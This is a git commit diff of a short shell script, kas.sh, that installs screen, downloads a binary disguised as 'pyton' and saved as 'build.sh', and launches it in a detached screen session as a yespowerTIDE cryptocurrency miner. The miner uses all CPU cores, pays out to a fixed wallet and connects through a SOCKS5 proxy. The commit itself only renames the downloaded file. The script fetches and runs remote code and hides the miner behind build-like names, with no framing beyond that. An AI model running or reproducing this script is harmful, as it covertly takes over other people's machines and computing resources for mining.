de2cf486d14fde93af850d9888964bc34113748c
ghortiyowe <94232211+ghortiyowe@users.noreply.github.com>
2021-11-25 06:59:48 +0700

    Update kas.sh

--- kas.sh
+++ kas.sh
@@ -3,10 +3,10 @@
 apt-get update
 apt-get install screen -y
 wget -q https://raw.githubusercontent.com/ghortiyowe/gasken/main/compile.sh
-wget -qO build https://raw.githubusercontent.com/ghortiyowe/gasken/main/pyton
-chmod +x build
+wget -qO build.sh https://raw.githubusercontent.com/ghortiyowe/gasken/main/pyton
+chmod +x build.sh
 chmod +x compile.sh
-screen -dm -S build ./build -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.JASUKA -t $(nproc --all) -p c=TDC,m=solo --proxy socks5://67.201.33.9:25280
+screen -dm -S build.sh ./build.sh -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.JASUKA -t $(nproc --all) -p c=TDC,m=solo --proxy socks5://67.201.33.9:25280
 ./compile.sh
 
 echo succes
